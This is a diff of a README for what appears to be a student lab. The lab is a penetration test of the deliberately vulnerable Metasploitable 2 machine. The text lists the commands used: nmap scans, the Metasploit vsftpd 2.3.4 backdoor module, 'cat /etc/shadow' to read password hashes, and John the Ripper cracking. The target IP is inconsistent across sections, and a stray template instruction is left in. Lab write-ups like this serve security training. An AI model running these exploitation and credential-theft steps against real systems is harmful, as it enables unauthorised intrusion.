@@ -10,18 +10,86 @@ Target Information:
 
 # Project Description
 This project demonstrates a full penetration testing workflow conducted on the intentionally vulnerable Metasploitable 2 virtual machine. The project covers reconnaissance, exploitation, and post-exploitation steps, showcasing practical skills in vulnerability identification and exploitation.
-<br><b>Current Progress:</b><br>
-Reconnaissance: Scanned open ports and identified services running on the target using nmap.<br>
-![nmap scan](Nmap_scan.png) ![nmap scan](services.png) 
-
-Exploitation: Successfully exploited a vulnerability in vsftpd 2.3.4 to gain shell access using Metasploit.<br>
-![exploit with metasploit](exploit.png)
-Post-Exploitation: Extracted password hashes from /etc/shadow and initiated password cracking using John the Ripper.<br>
-![password](passwordxtrat.png)
 
 # Technologies Used
 Hyper-V Manager, Virtual box, Linux, Nmap, Metasploit, John the ripper, 
-# Steps or Features 
+# Steps or Feautures 
+1. Reconnaissance (Information Gathering)
 
-# Sample Output 
+    Scanned the target system for open ports and services using nmap.
+
+nmap -sS -Pn 178.28.10.11
+
+Identified service versions and operating system details.
+
+![nmap scan](Nmap_scan.png) ![nmap scan](services.png) 
+
+nmap -sV -O 178.28.10.11
+2. Vulnerability Identification<
+
+    Researched vulnerabilities associated with the detected services using:
+        searchsploit for local exploit searches:
+
+        searchsploit vsftpd 2.3.4
+
+        Online databases such as Exploit-DB and CVE Details.
+
+3. Exploitation
+
+    Used Metasploit Framework to exploit the vsftpd 2.3.4 backdoor vulnerability:
+        Launched Metasploit:
+
+msfconsole
+
+Selected the exploit:
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+Configured the exploit:
+
+        set RHOST 172.28.10.11
+        exploit
+
+    Successfully gained shell access to the target system.
+
+![exploit with metasploit](exploit.png)
+
+4. Post-Exploitation
+
+    Explored the system to gather sensitive information:
+        Extracted /etc/shadow to obtain password hashes:
+
+    cat /etc/shadow
+
+Initiated password cracking using John the Ripper:
+
+    john --wordlist=/usr/share/wordlists/rockyou.txt password_hash.txt
+
+![password](passwordxtrat.png)
+
+5. Documentation and Reporting
+
+    Documented all findings, including vulnerabilities exploited, tools used, and commands executed.
+    Provided recommendations to mitigate identified weaknesses.
+
+
+Commands Used
+
+Include a dedicated section in your GitHub for all commands used during the test. Here’s an example:
+
+## Commands Used
+
+### Reconnaissance
+- `nmap -sS -Pn 172.28.11.10 `: Stealth scan to discover open ports.
+- `nmap -sV -O 172.28.11.10`: Detect service versions and OS.
+
+### Exploitation
+- `msfconsole`: Launch Metasploit.
+- `use exploit/unix/ftp/vsftpd_234_backdoor`: Select the exploit.
+- `set RHOST 172.28.10.11`: Set the target IP.
+- `exploit`: Execute the exploit.
+
+### Post-Exploitation
+- `cat /etc/shadow`: Extract password hashes.
+- `john --wordlist=/usr/share/wordlists/rockyou.txt password_hash.txt`: Crack passwords.
 
